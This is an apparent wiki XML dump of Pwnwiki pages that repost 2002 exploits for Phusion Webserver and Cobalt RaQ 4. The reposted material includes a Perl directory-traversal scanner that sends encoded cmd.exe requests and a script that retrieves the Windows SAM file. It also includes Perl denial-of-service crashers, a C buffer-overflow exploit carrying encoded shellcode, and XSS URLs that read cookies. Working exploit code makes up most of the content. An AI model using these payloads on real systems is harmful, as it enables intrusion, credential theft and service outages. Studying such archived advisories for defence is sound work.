      <comment>Created page with "==INFO1== &lt;pre&gt; source: http://www.securityfocus.com/bid/4117/info  Phusion Webserver is a commercial HTTP server that runs on Microsoft Windows 9x/NT/2000 operating systems...."</comment>
      <origin>798</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7337" sha1="4tvk4eker86kkzln7lo965xnhyvsxir" xml:space="preserve">==INFO1==
&lt;pre&gt;
source: http://www.securityfocus.com/bid/4117/info

Phusion Webserver is a commercial HTTP server that runs on Microsoft Windows 9x/NT/2000 operating systems.

Phusion Webserver is prone to directory traversal attacks. It is possible to break out of wwwroot using triple-dot-slash (.../) sequences containing HTTP-encoded variations of "/" and "\". As a result, a malicious web user may browse web-readable files on the host running the vulnerable software.

This vulnerability may potentially result in the disclosure of sensitive information contained in web-readable files on the host.

It should be noted that webservers normally run with SYSTEM privileges on Microsoft Windows operating systems. 

#!/usr/bin/perl
#
# Simple script to identify if the host is vulnerable!, 
# 
# This does 15 different checks based IIS 4-5. Have Fun!
#
# Phusion Webserver v1.0 proof-of-concept exploit
# By Alex Hernandez &lt;al3xhernandez@ureach.com&gt; (C)2002.
#
# Thanks all the people from Spain and Argentina.
# Special Greets: White-B, Pablo S0r, Paco Spain, L.Martins, 
# G.Maggiotti &amp; H.Oliveira.
# 
#
# Usage: perl -x Phusion_exp.pl &lt;Hosts&gt;:&lt;Port&gt;
#
# Example: 
#
# perl -x Phusion_exp.pl www.whitehouse.com:80
# Trying.....................
#
# &lt;THIS HOST IS VULNERABLE&gt; :-)
# Check the previous notes to execute bugs.
#
#

use Socket;

if ($#ARGV&lt;0) {die "
\nPhusion Webserver v1.0 traversal exploit(c)2002.
Alex Hernandez al3xhernandez\@ureach.com\n

Usage: perl -x $0 www.whitehouse.com:80 {OR}\n
[if the host is not using a proxy]\n
Usage: perl -x $0 127.0.0.1:80\n\n";}

($host,$port)=split(/:/,@ARGV[0]);
print "Trying.....................\n";
$target = inet_aton($host);
$flag=0;

# ---------------test method 1
my @results=sendraw("GET
/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir 
HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

# ---------------test method 2
my @results=sendraw("GET
/scripts..%c1%9c../winnt/system32/cmd.exe?/c+dir
HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

# ---------------test method 3
my @results=sendraw("GET
/scripts/..%c1%pc../winnt/system32/cmd.exe?/c+dir 
HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

# ---------------test method 4
my @results=sendraw("GET
/scripts/..%c0%9v../winnt/system32/cmd.exe?/c+dir 
HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

# ---------------test method 5
my @results=sendraw("GET
/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+dir 
HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

# ---------------test method 6
my @results=sendraw("GET
/scripts/..%c1%8s../winnt/system32/cmd.exe?/c+dir 
HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}


# ---------------test method 7
my @results=sendraw("GET
/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir 
HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

# ---------------test method 8
my @results=sendraw("GET
/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir 
HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}


# ---------------test method 9
my @results=sendraw("GET
/scripts/..%c1%af../winnt/system32/cmd.exe?/c+dir 
HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

# ---------------test method 10
my @results=sendraw("GET
/scripts/..%e0%80%af../winnt/system32/cmd.exe?/c+dir 
HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

# ---------------test method 11
my @results=sendraw("GET
/scripts/..%f0%80%80%af../winnt/system32/cmd.exe?/c+dir
HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

# ---------------test method 12
my @results=sendraw("GET
/scripts/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+dir
HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

# ---------------test method 13
my @results=sendraw("GET
/scripts/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+dir
HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

# ---------------test method 14
my @results=sendraw("GET
/msadc/..\%e0\%80\%af../..\%e0\%80\%af../..\%e0\%80\%af../
winnt/system32/cmd.exe\?/c\+dir
HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

# ---------------test method 15
my @results=sendraw("GET
/.../.../.../.../winnt/system32/cmd.exe\?/c\+dir
HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

#------------------------------
if ($flag==1){print "&lt;THIS HOST IS VULNERABLE&gt; :-)\n
Check the previous notes to execute bugs\n";}
else {print "&lt;THIS HOST IS NOT VULNERABLE&gt; :-( \n
Check manually on browser...\n";}


sub sendraw {   
        my ($pstr)=@_;
        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
                die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,$port,$target)){
                my @in;
                select(S);      $|=1;   print $pstr;
                while(&lt;S&gt;){ push @in, $_;}
                select(STDOUT); close(S); return @in;
        } else { die("Can't connect check the port or address...\n"); }
}
&lt;/pre&gt;

==INFO2==
&lt;pre&gt;
source: http://www.securityfocus.com/bid/4117/info
 
Phusion Webserver is a commercial HTTP server that runs on Microsoft Windows 9x/NT/2000 operating systems.
 
Phusion Webserver is prone to directory traversal attacks. It is possible to break out of wwwroot using triple-dot-slash (.../) sequences containing HTTP-encoded variations of "/" and "\". As a result, a malicious web user may browse web-readable files on the host running the vulnerable software.
 
This vulnerability may potentially result in the disclosure of sensitive information contained in web-readable files on the host.
 
It should be noted that webservers normally run with SYSTEM privileges on Microsoft Windows operating systems. 

#!/usr/bin/perl
#
# THIS SCRIPT ONLY FOR WINDOWS WITH PERL OR CYGWIN 
# 
# Simple script to get files on server. 
# 
# Maybe u need this line for windows:
# #! c:\perl\bin\perl.exe
#
# Phusion Webserver v1.0 proof-of-concept exploit.
# By Alex Hernandez &lt;al3xhernandez@ureach.com&gt; (C)2002.
#
# Thanks all the people from Spain and Argentina.
# Special Greets: White-B, Pablo S0r, Paco Spain, L.Martins, 
# G.Maggiotti &amp; H.Oliveira.
# 
#
# Usage: perl -x Phusion-GET.pl &lt;And read the Intructions&gt;
#  
#


print("\nPhusion Webserver v1.0 GET Files exploit (c)2002.\n");
print("Alex Hernandez al3xhernandez\@ureach.com\n\n");


print &lt;&lt;"EOT";
Please type the address remote webserver, example: www.whitehouse.gov
[Default remote Webserver is "127.0.0.1"`]:
EOT
$host = &lt;&gt;;

print &lt;&lt;"EOT";
Please type only in the directory where the file is located you want to
download, 
example: /winnt/repair/
[default directory is "/winnt/repair/"] :#For IIS 4-5
EOT
$directory = &lt;&gt; || "/winnt/repair/";


print &lt;&lt;"EOT";
Please type in the filename you want download example: sam._ 
[default file is "sam._"] :
EOT
$file = &lt;&gt; || "sam._";

{
#Maybe u to change this line depending of PATH installation.
system("explorer.exe", "http://$host:80/../../..$directory$file");
}

print &lt;&lt;"EOT";
&lt;/pre&gt;</text>
      <sha1>4tvk4eker86kkzln7lo965xnhyvsxir</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2002-0289 Phusion web server 1.0 任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>585</id>
    <revision>
      <id>799</id>
      <timestamp>2021-03-31T07:13:31Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO1== &lt;pre&gt; source: http://www.securityfocus.com/bid/4118/info  Phusion Webserver is a commercial HTTP server that runs on Microsoft Windows 9x/NT/2000 operating systems...."</comment>
      <origin>799</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7402" sha1="eqn70r79h83vb0w7qq9ishu4wew1le7" xml:space="preserve">==INFO1==
&lt;pre&gt;
source: http://www.securityfocus.com/bid/4118/info

Phusion Webserver is a commercial HTTP server that runs on Microsoft Windows 9x/NT/2000 operating systems.

It is possible for a remote attacker to deny service to legitimate users of the service by submitting an excessively long web request (approximately 3000+ bytes).

It should be noted that this issue is due to a remotely exploitable buffer overflow condition. 

#!/usr/bin/perl
#
# Simple script to send a long 'A^s' command to the server, 
# resulting in the server crashing.
#
# Phusion Webserver v1.0 proof-of-concept exploit.
# By Alex Hernandez &lt;al3xhernandez@ureach.com&gt; (C)2002.
#
# Thanks all the people from Spain and Argentina.
# Special Greets: White-B, Pablo S0r, Paco Spain, L.Martins, 
# G.Maggiotti &amp; H.Oliveira.
# 
#
# Usage: perl -x Phusion_DoS.pl -s &lt;server&gt;
#
# Example: 
#
# perl -x Phusion_DoS.pl -s 10.0.0.1
# 
# Crash was successful !
#

use Getopt::Std;
use IO::Socket;

print("\nPhusion Webserver v1.0 DoS exploit (c)2002.\n");
print("Alex Hernandez al3xhernandez\@ureach.com\n\n");

getopts('s:', \%args);
if(!defined($args{s})){&amp;usage;}

($serv,$port,$def,$num,$data,$buf,$in_addr,$paddr,$proto);

$def = "A";
$num = "3000";
$data .= $def x $num;
$serv = $args{s};
$port = 80;
$buf = "GET /cgi-bin/$data /HTTP/1.0\r\n\r\n";


$in_addr = (gethostbyname($serv))[4] || die("Error: $!\n");
$paddr = sockaddr_in($port, $in_addr) || die ("Error: $!\n");
$proto = getprotobyname('tcp') || die("Error: $!\n");

socket(S, PF_INET, SOCK_STREAM, $proto) || die("Error: $!");
connect(S, $paddr) ||die ("Error: $!");
select(S); $| = 1; select(STDOUT);
print S "$buf";


print("\nCrash was successful !\n\n");

sub usage {die("\n\nUsage: perl -x $0 -s &lt;server&gt;\n\n");}
&lt;/pre&gt;

==INFO2==
&lt;pre&gt;
source: http://www.securityfocus.com/bid/4119/info

Phusion Webserver is a commercial HTTP server that runs on Microsoft Windows 9x/NT/2000 operating systems.

Phusion Webserver does not perform sufficient bounds checking of externally supplied data. As a result, it is possible for a remote attacker to submit an excessively long web request which may cause stack variables to be overwritten with attacker-supplied instructions.

As webservers normally run with SYSTEM privileges on Microsoft Windows operating systems, this may result in a full compromise of a host running the vulnerable software.

It should be noted that this unchecked buffer may also be exploited to cause a denial of service condition.

/** Phusion-Overun.c 
** -Remote exploit for Phusion Webserver v1.0 for WinNT.
**
** Phusion Webserver v1.0 exploit gets remote servers's full control.
** When you attacks a vulnerable server you can run abitrary code
** inside.
**
** Phusion Webserver v1.0 proof-of-concept exploit.
** By Alex Hernandez &lt;al3xhernandez@ureach.com&gt; (C)2002.
**
** Thanks all the people from Spain and Argentina.
** Special Greets: White-B, Pablo S0r, Paco Spain, L.Martins, 
** G.Maggiotti &amp; H.Oliveira.
** 
**
** Compile: gcc -o Phusion-ovrun Phusion-ovrun.c
**
** Usage: ./Phusion-ovrun &lt;hostname&gt;
**
**
** 
**
**/


#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/errno.h&gt;
#include &lt;netdb.h&gt;

#define _PORT   80
#define _X 10000

char runcrash[] =
"GET /"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x81\xc7\xc8\x10\x10\x10\x81\xef\x10"
"\x10\x10\x10\x57\x5e\x33\xc0\x66\xb8\x31\x02\x90\x90\x50"
"\x59\xac\x34\x99\xaa\xe2\xfa\x71\x99\x99\x99\x99\xc4\x18"
"\x74\xb1\x89\xd9\x99\xf3\x99\xf1\x19\x99\x99\x99\xf3\x9b"
"\xf3\x99\xf3\x99\xf1\x99\x99\x99\xd9\x14\x2c\xac\x8b\xd9"
"\x99\xcf\xf1\x19\x02\xd4\x99\xc3\x66\x8b\xc9\xc2\xf3\x99"
"\x14\x24\x3a\x89\xd9\x99\xaa\x59\x32\x14\x2c\x3a\x89\xd9"
"\x99\xcf\xf1\xd3\x98\x99\x99\x09\x14\x2c\x72\x89\xd9\x99"
"\xcf\xca\xf1\x49\x05\xd4\x99\xc3\x66\x8b\xca\xf1\x05\x02"
"\xd4\x99\xc3\x66\x8b\xf1\xa9\xd4\xde\x99\xc6\x14\x2c\x3e"
"\x89\xd9\x99\xf3\xdd\x09\x09\x09\x09\xc0\x35\x33\x7b\x65"
"\xf3\x99\x23\x31\x02\xd4\x99\x66\x8b\x99\x99\x99\x99\xca"
"\xfc\xeb\xef\xfc\xeb\xb9\xf1\xf8\xfa\xf2\xfc\xfd\xb7\xa5"
"\xb6\xf1\xab\xa7\xf1\xed\xed\xe9\xa3\xb6\xb6\xee\xee\xee"
"\xb7\xfd\xfc\xfc\xe9\xe3\xf6\xf7\xfc\xb7\xf6\xeb\xfe\xb9"
"\xb9\xca\xe9\xf5\xf6\xf0\xed\xb9\xfa\xf6\xfd\xfc\xfd\xb9"
"\xfb\xe0\xb9\xe5\xc3\xf8\xf7\xb9\xe4\xa3\xb0\xa5\xf1\xed"
"\xf4\xf5\xa7\xa5\xf1\xfc\xf8\xfd\xa7\xa5\xed\xf0\xed\xf5"
"\xfc\xa7\xca\xfc\xeb\xef\xfc\xeb\xb9\xf1\xf8\xfa\xf2\xfc"
"\xfd\xb7\xa5\xb6\xed\xf0\xed\xf5\xfc\xa7\xa5\xb6\xf1\xfc"
"\xf8\xfd\xa7\xa5\xfb\xf6\xfd\xe0\xa7\xa5\xfa\xfc\xf7\xed"
"\xfc\xeb\xa7\xd1\xfc\xf5\xf5\xf6\xb7\xb9\xc0\xf6\xec\xb9"
"\xf8\xeb\xfc\xb9\xeb\xec\xf7\xf7\xf0\xf7\xfe\xb9\xf8\xb9"
"\xc3\xdb\xca\xfc\xeb\xef\xfc\xeb\xb9\xc9\xcb\xd6\xea\xb9"
"\xfb\xec\xfe\xfe\xe0\xb9\xef\xfc\xeb\xea\xf0\xf6\xf7\xb9"
"\xf8\xf7\xfd\xb9\xe0\xf6\xec\xb9\xf1\xf8\xef\xfc\xb9\xfb"
"\xfc\xfc\xf7\xb9\xf8\xfb\xec\xea\xfc\xfd\xb7\xa5\xe9\xa7"
"\xd4\xf6\xeb\xfc\xb9\xf0\xf7\xff\xf6\xeb\xf4\xf8\xed\xf0"
"\xf6\xf7\xb9\xfa\xf8\xf7\xb9\xfb\xfc\xb9\xfd\xf6\xee\xf7"
"\xf5\xf6\xf8\xfd\xb9\xff\xeb\xf6\xf4\xb9\xf1\xed\xed\xe9"
"\xa3\xb6\xb6\xee\xee\xee\xb7\xfd\xfc\xfc\xe9\xe3\xf6\xf7"
"\xfc\xb7\xf6\xeb\xfe\xb9\xf6\xeb\xb9\xf1\xed\xed\xe9\xa3"
"\xb6\xb6\xf4\xf8\xeb\xfc\xf8\xea\xef\xf0\xef\xf8\xea\xb7"
"\xfa\xf3\xfb\xb7\xf7\xfc\xed\xa5\xe9\xa7\xeb\xfc\xfe\xf8"
"\xeb\xfd\xea\xb9\xed\xf6\xb9\xdd\xfc\xfc\xe9\xc3\xf6\xf7"
"\xfc\xb9\xfa\xeb\xfc\xee\xb9\xb1\xcd\xf1\xfc\xce\xf0\xe3"
"\xf8\xeb\xfd\xb5\xb9\xd8\xf7\xec\xea\xf2\xf8\xb9\xf8\xf7"
"\xfd\xb9\xd7\xfc\xf4\xf6\xb0\xa5\xe9\xa7\xda\xf6\xfd\xfc"
"\xfd\xb9\xfb\xe0\xb9\xe5\xc3\xf8\xf7\xb7\xa5\xb6\xfa\xfc"
"\xf7\xed\xfc\xeb\xa7\xa5\xb6\xfb\xf6\xfd\xe0\xa7\xa5\xb6"
"\xf1\xed\xf4\xf5\xa7\xb7\xc5\xf1\xed\xf4\xf5\xc5\xca\xfc"
"\xeb\xef\xfc\xeb\xd8\xfb\xec\xea\xfc\xfd\xfb\xe0\xf0\xc3"
"\xf8\xf7\xb7\xf1\xed\xf4\xf5\x99\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\xac\xe0\xe3\x01";


int     sock;
struct  sockaddr_in sock_a;
struct  hostent *host;

int main (int argc, char *argv[]) {

printf("\nWinNT 4.0 sp5 Phusion Webserver v1.0 BufferOverrun exploit\n");
printf("Alex Hernandez al3xhernandez@ureach.com\n\n");

if(argc &lt; 2) {
   fprintf(stderr, "Error : Usage: %s &lt;hostname&gt; \n", argv[0]);
   exit(0);
  }


if((host=(struct hostent *)gethostbyname(argv[1])) == NULL) {
    perror("gethostbyname");
    exit(-1);
  }

if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))&lt;0) {
    perror("create socket");
    exit(-1);
  }

sock_a.sin_family=AF_INET;
sock_a.sin_port=htons(_PORT);
memcpy((char *)&amp;sock_a.sin_addr,(char *)host-&gt;h_addr,host-&gt;h_length);
if(connect(sock,(struct sockaddr *)&amp;sock_a,sizeof(sock_a))!=0) {
    perror("create connect");
    exit(-1);
  }

  fflush(stdout);

  write(sock,runcrash,_X);
  write(sock,"\n\n", 2);
  printf("done.\n\n");

}
&lt;/pre&gt;</text>
      <sha1>eqn70r79h83vb0w7qq9ishu4wew1le7</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2002-0346 Cobalt RAQ 4 Server XSS任意腳本執行漏洞</title>
    <ns>0</ns>
    <id>586</id>
    <revision>
      <id>800</id>
      <timestamp>2021-03-31T07:14:58Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; ------oOo---------------- Cobalt RAQ 4 Server Management, Cross Site Scripting , Directory Traversal &amp; DoS Vulnerabilities. ------oOo----------------   Company..."</comment>
      <origin>800</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2883" sha1="j9gpc86bgc9is6tlc35qviqg0u22lxj" xml:space="preserve">==INFO==
&lt;pre&gt;
------oOo----------------
Cobalt RAQ 4 Server Management,
Cross Site Scripting , Directory Traversal &amp; DoS Vulnerabilities.
------oOo----------------


Company Affected: www.cobalt.com &amp; www.sun.com
Version: RAQ 4 Server Management.
Dowload: http://www.cobalt.com/products/raq/index.html
OS Affected: Linux ALL, Solaris ALL.


Author:

** Alex Hernandez &lt;al3xhernandez@ureach.com&gt;
** Thanks all the people from Spain and Argentina.
** Special Greets: White-B, Pablo S0r, Paco Spain, G.Maggiotti.


----=[Brief Description]=------------

The Sun Cobalt RaQ is a server appliance for Internet Service Providers
(ISPs). 
It can host up to 200 individual websites or it can be dedicated to a
single medium or large customer. This versatility opens up tremendous 
opportunity for service provider to invest in a single piece of hardware 
while migrating business customers up to dedicated servers.

Cobalt's service.cgi incorrectly handles the incoming search parses,
incoming HTML tags or JavaScript will be included inside the result without 
them being filtered out for dangerous content. A similar problem occurs with 
the x.cgi's inclusion of malicious code inside the resulting title search.

The cgi^s files is an open source .A security vulnerability in the
product allows attackers to insert malicious content into existing web pages by
exploiting the Cross-Site Scripting Vulnerability.


Affected Files Cgi^s

alert.cgi  
service.cgi


Workaround:
1) Delete service.cgi from the system, or disable its possible
execution.
2) Delete alert.cgi from the system, or disable its possible execution


EXAMPLES:

http://10.0.0.1:81/cgi-bin/.cobalt/alert/service.cgi?service=&lt;h1&gt;Hello!&lt;/h1&gt;&lt;script&gt;alert('hello')&lt;/script&gt;
http://10.0.0.1:81/cgi-bin/.cobalt/alert/service.cgi?service=&lt;script&gt;alert('Microsoft%20hole')&lt;/script&gt;
http://10.0.0.1:81/cgi-bin/.cobalt/alert/service.cgi?service=&lt;img%20src=javascript:alert(document.domain)&gt;
http://10.0.0.1:81/cgi-bin/.cobalt/alert/service.cgi?service=&lt;script&gt;alert(document.cookie)&lt;/script&gt;

LOCATION:
http://10.0.0.1:81/cgi-bin/.cobalt/alert/service.cgi?service=%3Cscript%3Ealert(document.location)%3C/script%3E

COOKIES:
http://10.0.0.1:81/cgi-bin/.cobalt/alert/service.cgi?service=%3Cscript%3Ealert(document.cookie)%3C/script%3E

TAG IMAGES:
http://10.0.0.1:81/cgi-bin/.cobalt/alert/service.cgi?service=&lt;img%20src=javascript:alert(document.domain)&gt;


WRITE ON DOCUMENT:
http://10.0.0.1:81/cgi-bin/.cobalt/alert/service.cgi?service=&lt;SCRIPT&gt;document.write(document.domain)&lt;/SCRIPT&gt;


Vendor Response:
The vendor was notified

Posted List^s Security cobalt:
cobalt-security@list.cobalt.com &amp;
jlovell@sun.com

http://www.cobalt.com
Patch Temporary: 
Delete files cgi^s from the system, or disable its 
possible execution.

Alex Hernandez &lt;al3xhernandez@ureach.com&gt; (c) 2002.

------oOo------------------------------------
&lt;/pre&gt;</text>
      <sha1>j9gpc86bgc9is6tlc35qviqg0u22lxj</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2002-0347 Cobalt RAQ 4 Server 目錄遍歷漏洞</title>
    <ns>0</ns>
    <id>587</id>
    <revision>
      <id>801</id>
      <timestamp>2021-03-31T07:16:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; ------oOo---------------- Cobalt RAQ 4 Server Management, Cross Site Scripting , Directory Traversal &amp; DoS Vulnerabilities. ------oOo----------------   Company..."</comment>
      <origin>801</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1220" sha1="g7gq3ib5e797pahwx5mjps6qsw8wo71" xml:space="preserve">==INFO==
&lt;pre&gt;
------oOo----------------
Cobalt RAQ 4 Server Management,
Cross Site Scripting , Directory Traversal &amp; DoS Vulnerabilities.
------oOo----------------


Company Affected: www.cobalt.com &amp; www.sun.com
Version: RAQ 4 Server Management.
Dowload: http://www.cobalt.com/products/raq/index.html
OS Affected: Linux ALL, Solaris ALL.


Author:

** Alex Hernandez &lt;al3xhernandez@ureach.com&gt;
** Thanks all the people from Spain and Argentina.
** Special Greets: White-B, Pablo S0r, Paco Spain, G.Maggiotti.


----=[Brief Description]=------------

Traversal File configuration.


Exploit:
http://10.0.0.1:81/.cobalt/sysManage/../admin/.htaccess

# Access file for /usr/admserv/html/.cobalt/admin/ (admin  )
order allow,deny
allow from all
require user admin
Authname CobaltRaQ
Authtype Basic


Directory by Default on server is: "/usr/admserv/html/.cobalt/admin" u
can translate to any directory for capture restricted files or passwords 
and profiles the users.

Vendor Response:
The vendor was notified

Posted List^s Security cobalt:
cobalt-security@list.cobalt.com &amp;
jlovell@sun.com

http://www.cobalt.com

Alex Hernandez &lt;al3xhernandez@ureach.com&gt; (c) 2002.

------oOo------------------------------------
&lt;/pre&gt;</text>
      <sha1>g7gq3ib5e797pahwx5mjps6qsw8wo71</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2002-0348 Cobalt RAQ 4 Server 漏洞</title>
    <ns>0</ns>
    <id>588</id>
    <revision>
      <id>802</id>
      <timestamp>2021-03-31T07:17:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; ------oOo---------------- Cobalt RAQ 4 Server Management, Cross Site Scripting , Directory Traversal &amp; DoS Vulnerabilities. ------oOo----------------   Company..."</comment>
      <origin>802</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4045" sha1="kfsptt778qvbk14uo8f5twfp2v1k4tc" xml:space="preserve">==INFO==
&lt;pre&gt;
------oOo----------------
Cobalt RAQ 4 Server Management,
Cross Site Scripting , Directory Traversal &amp; DoS Vulnerabilities.
------oOo----------------


Company Affected: www.cobalt.com &amp; www.sun.com
Version: RAQ 4 Server Management.
Dowload: http://www.cobalt.com/products/raq/index.html
OS Affected: Linux ALL, Solaris ALL.


Author:

** Alex Hernandez &lt;al3xhernandez@ureach.com&gt;
** Thanks all the people from Spain and Argentina.
** Special Greets: White-B, Pablo S0r, Paco Spain, G.Maggiotti.


----=[Brief Description]=------------

Denial Of service. 


Proof Of concept:

Server crashes after sending a very long URL:

Example:

http://10.0.0.1:81/cgi-bin/.cobalt/alert/service.cgi?service=/AAAAAAAAA...(Ax100000)...AAA


Crash system and the admin need restart the service!.


------oOo-------------
Exploit Code DoS Cobalt4_DoS.pl
------oOo-------------


#!/usr/bin/perl
#
# Simple script to send a long 'A^s' command to the server, 
# resulting in the server crashing.
#
# Cobalt RAQ DoS v4 proof-of-concept exploit.
# By Alex Hernandez &lt;al3xhernandez@ureach.com&gt; (C)2002.
#
# Thanks all the people from Spain and Argentina.
# Special Greets: White-B, Pablo S0r, Paco Spain, G.Maggiotti.
# 
#
# Usage: perl -x Cobalt4_DoS.pl -s &lt;server&gt;
#
# Example: 
#
# perl -x Cobalt4_DoS.pl -s 10.0.0.1
# 
# Crash was successful !
#

use Getopt::Std;
use IO::Socket;

print("\nCobalt RAQ DoS v4.0 DoS exploit (c)2002.\n");
print("Alex Hernandez al3xhernandez\@ureach.com\n\n");

getopts('s:', \%args);
if(!defined($args{s})){&amp;usage;}

($serv,$port,$def,$num,$data,$buf,$in_addr,$paddr,$proto);

$def = "A";
$num = "100000";
$data .= $def x $num;
$serv = $args{s};
$port = 81;#maybe u define the port for diference of versions
$buf = "GET /cgi-bin/.cobalt/alert/service.cgi?service=$data
/HTTP/1.0\r\n\r\n";


$in_addr = (gethostbyname($serv))[4] || die("Error: $!\n");
$paddr = sockaddr_in($port, $in_addr) || die ("Error: $!\n");
$proto = getprotobyname('tcp') || die("Error: $!\n");

socket(S, PF_INET, SOCK_STREAM, $proto) || die("Error: $!");
connect(S, $paddr) ||die ("Error: $!");
select(S); $| = 1; select(STDOUT);
print S "$buf";


print("\nCrash was successful !\n\n");

sub usage {die("\n\nUsage: perl -x $0 -s &lt;server&gt;\n\n");}


------oOo------------------------------------
Vendor Response:
The vendor was notified

Posted List^s Security cobalt:
cobalt-security@list.cobalt.com &amp;
jlovell@sun.com

http://www.cobalt.com
Patch Temporary: 
Delete files cgi^s from the system, or disable its 
possible execution.

Alex Hernandez &lt;al3xhernandez@ureach.com&gt; (c) 2002.

------oOo------------------------------------
&lt;/pre&gt;

==Cobalt4_DoS.pl==
&lt;pre&gt;
#!/usr/bin/perl
#
# Simple script to send a long 'A^s' command to the server, 
# resulting in the server crashing.
#
# Cobalt RAQ DoS v4 proof-of-concept exploit.
# By Alex Hernandez &lt;al3xhernandez@ureach.com&gt; (C)2002.
#
# Thanks all the people from Spain and Argentina.
# Special Greets: White-B, Pablo S0r, Paco Spain, G.Maggiotti.
# 
#
# Usage: perl -x Cobalt4_DoS.pl -s &lt;server&gt;
#
# Example: 
#
# perl -x Cobalt4_DoS.pl -s 10.0.0.1
# 
# Crash was successful !
#

use Getopt::Std;
use IO::Socket;

print("\nCobalt RAQ DoS v4.0 DoS exploit (c)2002.\n");
print("Alex Hernandez al3xhernandez\@ureach.com\n\n");

getopts('s:', \%args);
if(!defined($args{s})){&amp;usage;}

($serv,$port,$def,$num,$data,$buf,$in_addr,$paddr,$proto);

$def = "A";
$num = "100000";
$data .= $def x $num;
$serv = $args{s};
$port = 81;#maybe u define the port for diference of versions
$buf = "GET /cgi-bin/.cobalt/alert/service.cgi?service=$data
/HTTP/1.0\r\n\r\n";


$in_addr = (gethostbyname($serv))[4] || die("Error: $!\n");
$paddr = sockaddr_in($port, $in_addr) || die ("Error: $!\n");
$proto = getprotobyname('tcp') || die("Error: $!\n");

socket(S, PF_INET, SOCK_STREAM, $proto) || die("Error: $!");
connect(S, $paddr) ||die ("Error: $!");
select(S); $| = 1; select(STDOUT);
print S "$buf";


print("\nCrash was successful !\n\n");

sub usage {die("\n\nUsage: perl -x $0 -s &lt;server&gt;\n\n");}

&lt;/pre&gt;</text>
      <sha1>kfsptt778qvbk14uo8f5twfp2v1k4tc</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2002-0448 Xerver Free Web Server拒絕服務漏洞</title>
    <ns>0</ns>
    <id>589</id>
    <revision>
      <id>803</id>
      <timestamp>2021-03-31T07:19:17Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; source: http://www.securityfocus.com/bid/4254/info  Xerver is a freely available webserver, written in Java. It will run on any operating system with Java insta..."</comment>
      <origin>803</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
